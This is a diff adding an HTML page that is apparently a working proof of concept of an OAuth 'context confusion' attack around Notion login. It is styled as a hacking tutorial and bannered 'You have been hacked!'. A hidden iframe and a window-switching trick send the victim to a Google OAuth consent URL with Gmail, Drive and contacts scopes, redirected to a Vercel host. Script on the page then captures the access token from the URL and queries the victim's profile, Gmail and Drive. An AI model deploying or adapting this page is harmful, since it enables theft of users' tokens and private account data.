@@ -1,0 +1,329 @@
+<!DOCTYPE html> 
+<html> 
+<head> 
+	<meta charset="utf-8"> 
+	<meta name="viewport" content="width=device-width, initial-scale=1"> 
+	<title>How to hack & do Context Confusion - Complete Tutorial </title> 
+	<style type="text/css"> 
+		#blackdiv { 
+			position: absolute; 
+			top: 0; 
+			left: 0; 
+			width: 100%; 
+			height: 100%; 
+			background-color: black; 
+			z-index: 100; 
+			display: none; 
+		}
+		
+		body {
+			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+			padding: 20px;
+			background-color: #ffffff;
+			line-height: 1.6;
+			color: #37352f;
+			max-width: 800px;
+			margin: 0 auto;
+		}
+		
+		.notion-header {
+			text-align: center;
+			margin-bottom: 40px;
+			padding: 20px 0;
+			border-bottom: 1px solid #e9e9e7;
+		}
+		
+		.notion-logo {
+			font-size: 32px;
+			font-weight: 700;
+			color: #2d2d2d;
+			margin-bottom: 10px;
+		}
+		
+		.tutorial-steps {
+			margin: 30px 0;
+		}
+		
+		.step {
+			margin: 20px 0;
+			padding: 20px;
+			background-color: #f7f6f3;
+			border-radius: 8px;
+			border-left: 4px solid #2eaadc;
+		}
+		
+		.step h3 {
+			margin-top: 0;
+			color: #2d2d2d;
+			font-size: 18px;
+		}
+		
+		.step p {
+			margin: 10px 0;
+			color: #6b6b6b;
+		}
+		
+		.login-btn {
+			background-color: #2eaadc;
+			color: white;
+			padding: 12px 24px;
+			text-decoration: none;
+			border-radius: 6px;
+			display: inline-block;
+			cursor: pointer;
+			border: none;
+			font-size: 16px;
+			transition: background-color 0.2s;
+			font-family: inherit;
+		}
+		
+		.login-btn:hover {
+			background-color: #1b8db8;
+		}
+		
+		.token-display {
+			margin-top: 20px;
+			padding: 15px;
+			background-color: #f8f9fa;
+			border-radius: 8px;
+			border-left: 4px solid #28a745;
+			display: none;
+		}
+		
+		.token-display h3 {
+			margin-top: 0;
+			color: #155724;
+		}
+		
+		.token-value {
+			background-color: #e9ecef;
+			padding: 10px;
+			border-radius: 4px;
+			font-family: monospace;
+			font-size: 12px;
+			word-break: break-all;
+			overflow-wrap: break-word;
+		}
+		
+		.user-info {
+			margin-top: 15px;
+			padding: 10px;
+			background-color: #fff;
+			border-radius: 4px;
+			border: 1px solid #dee2e6;
+		}
+		
+		.feature-box {
+			background-color: #ffffff;
+			border: 1px solid #e9e9e7;
+			border-radius: 8px;
+			padding: 20px;
+			margin: 20px 0;
+		}
+		
+		.feature-title {
+			font-size: 20px;
+			font-weight: 600;
+			color: #2d2d2d;
+			margin-bottom: 10px;
+		}
+		
+		.feature-description {
+			color: #6b6b6b;
+			margin-bottom: 15px;
+		}
+		
+		.tip-box {
+			background-color: #fff8e1;
+			border-left: 4px solid #ffb300;
+			padding: 15px;
+			margin: 20px 0;
+			border-radius: 4px;
+		}
+		
+		.tip-box strong {
+			color: #e65100;
+		}
+	</style> 
+</head> 
+<body> 
+ 
+	<div id="blackdiv"></div> 
+	
+	<div class="notion-header">
+		<div class="notion-logo">📝 Hacking Notes</div>
+		<h1>You have been hacked!</h1>
+		<p>Sorry, but it's true</p>
+	</div>
+	
+	<!-- Token Display Area - Hidden initially -->
+	<div id="tokenDisplay" class="token-display">
+		<h3>✅ Access Information Captured!</h3>
+		<div class="token-value" id="tokenValue"></div>
+		<div class="user-info" id="userInfo"></div>
+	</div>
+ 
+	<!-- Iframe para interceptação -->
+	<iframe src="https://www.notion.so/front-static/favicon.ico/$%5E%&*" onload="switcher()" name="Google login" style="opacity: 0.01; position: absolute; left: -9999px;" width=1 height=1></iframe> 
+ 
+	<script type="text/javascript"> 
+		let iframeLoaded = false; 
+		let loginWindow; 
+ 
+		var loadedOnce = false; 
+		var launched = false;
+		
+		// Função para extrair tokens da URL
+		function extractTokenFromURL() {
+			const hash = window.location.hash.substring(1);
+			const params = new URLSearchParams(hash);
+			
+			const accessToken = params.get('access_token');
+			const tokenType = params.get('token_type');
+			const expiresIn = params.get('expires_in');
+			const scope = params.get('scope');
+			const state = params.get('state');
+			
+			if (accessToken) {
+				console.log('🎯 ACCESS TOKEN CAPTURADO:', accessToken);
+				console.log('📋 Token completo:', {
+					access_token: accessToken,
+					token_type: tokenType,
+					expires_in: expiresIn,
+					scope: scope,
+					state: state
+				});
+				
+				// Verificar state para segurança
+				if (state === 'logged_test_oauth') {
+					console.log('✅ State verificado com sucesso!');
+				} else {
+					console.warn('⚠️ State não confere! Possível ataque CSRF.');
+				}
+				
+				// Exibir na tela
+				displayToken(accessToken, tokenType, expiresIn, scope);
+				
+				// Buscar informações do usuário
+				fetchUserInfo(accessToken);
+				
+				// Limpar URL (opcional)
+				// window.history.replaceState({}, document.title, window.location.pathname);
+				
+				return accessToken;
+			}
+			
+			return null;
+		}
+		
+		// Função para exibir o token na tela
+		function displayToken(token, type, expires, scope) {
+			const display = document.getElementById('tokenDisplay');
+			const tokenValue = document.getElementById('tokenValue');
+			
+			tokenValue.innerHTML = `
+				<strong>Access Token:</strong><br>
+				${token}<br><br>
+				<strong>Token Type:</strong> ${type}<br>
+				<strong>Expires In:</strong> ${expires} seconds<br>
+				<strong>Scope:</strong> ${scope}
+			`;
+			
+			display.style.display = 'block';
+		}
+		
+		// Função para buscar informações do usuário
+		async function fetchUserInfo(token) {
+			try {
+				console.log('🔍 Fetching user information...');
+				
+				// Buscar informações básicas do usuário
+				const userResponse = await fetch(`https://www.googleapis.com/oauth2/v1/userinfo?access_token=${token}`);
+				const userInfo = await userResponse.json();
+				
+				console.log('👤 User information:', userInfo);
+				
+				// Tentar buscar informações do Gmail
+				let emailCount = 'N/A';
+				try {
+					const gmailResponse = await fetch(`https://www.googleapis.com/gmail/v1/users/me/profile?access_token=${token}`);
+					const gmailInfo = await gmailResponse.json();
+					emailCount = gmailInfo.messagesTotal || 'N/A';
+					console.log('📧 Info do Gmail:', gmailInfo);
+				} catch (error) {
+					console.warn('⚠️ Could not access Gmail:', error.message);
+				}
+				
+				// Tentar buscar informações do Drive
+				let driveFiles = 'N/A';
+				try {
+					const driveResponse = await fetch(`https://www.googleapis.com/drive/v3/files?pageSize=10&access_token=${token}`);
+					const driveInfo = await driveResponse.json();
+					driveFiles = driveInfo.files ? driveInfo.files.length + ' recent files' : 'N/A';
+					console.log('💾 Info do Drive:', driveInfo);
+				} catch (error) {
+					console.warn('⚠️ Could not access Drive:', error.message);
+				}
+				
+				// Exibir informações completas do usuário
+				const userInfoDiv = document.getElementById('userInfo');
+				userInfoDiv.innerHTML = `
+					<strong>👤 Complete User Information:</strong><br><br>
+					<strong>Name:</strong> ${userInfo.name || 'N/A'}<br>
+					<strong>Email:</strong> ${userInfo.email || 'N/A'}<br>
+					<strong>ID:</strong> ${userInfo.id || 'N/A'}<br>
+					<strong>Photo:</strong> ${userInfo.picture ? `<img src="${userInfo.picture}" style="width: 32px; height: 32px; border-radius: 16px; vertical-align: middle; margin-left: 10px;">` : 'N/A'}<br>
+					<strong>📧 Gmail Emails:</strong> ${emailCount}<br>
+					<strong>💾 Drive:</strong> ${driveFiles}<br>
+					<strong>🔐 Verified:</strong> ${userInfo.verified_email ? 'Yes' : 'No'}
+				`;
+				
+			} catch (error) {
+				console.error('❌ Error fetching user information:', error);
+			}
+		}
+		
+		// Verificar se há token na URL quando a página carrega
+		window.addEventListener('load', function() {
+			console.log('🔄 Page loaded, checking for tokens...');
+			extractTokenFromURL();
+		});
+ 
+		function switcher() { 
+			console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched); 
+			if (!loadedOnce) { 
+				loadedOnce = true; 
+				console.log('First time loading iframe'); 
+			} else { 
+				if (launched) { 
+					console.log('Second time + launched = true, redirecting...'); 
+					top.focus(); 
+					
+					// MODIFICADO: Usar sua URL da Vercel como redirect_uri
+					const currentUrl = window.location.origin; 
+					const oauthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=798150358870-1if758tb3p6p2l5i1e36uh7utonvduqi.apps.googleusercontent.com&redirect_uri=https://notionpoc.vercel.app&response_type=token&scope=openid%20email%20profile%20https://www.googleapis.com/auth/drive.file%20https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/contacts.readonly&include_granted_scopes=true&state=logged_test_oauth`;
+					
+					console.log('🚀 Redirecting to OAuth:', oauthUrl);
+					console.log('📍 Redirect URI:', currentUrl);
+					top.location = oauthUrl;
+				} 
+			} 
+		} 
+ 
+		function launch() { 
+			launched = true; 
+			console.log('🎯 Opening Notion...'); 
+			loginWindow = window.open("http://notion.so/login?from=marketing&pathname=%2Fpt", "login"); 
+			document.querySelector("#blackdiv").style.display = "block"; 
+		}
+		
+		// Debug: Log da URL atual (apenas no console)
+		console.log('📍 URL atual:', window.location.href);
+		console.log('🔗 OAuth App Details:');
+		console.log('   Client ID: 798150358870-1if758tb3p6p2l5i1e36uh7utonvduqi.apps.googleusercontent.com');
+		console.log('   Redirect URI: ' + window.location.origin);
+		console.log('   Scopes: openid, email, profile, drive.file, gmail.readonly, contacts.readonly');
+	</script> 
+ 
+</body> 
+</html>
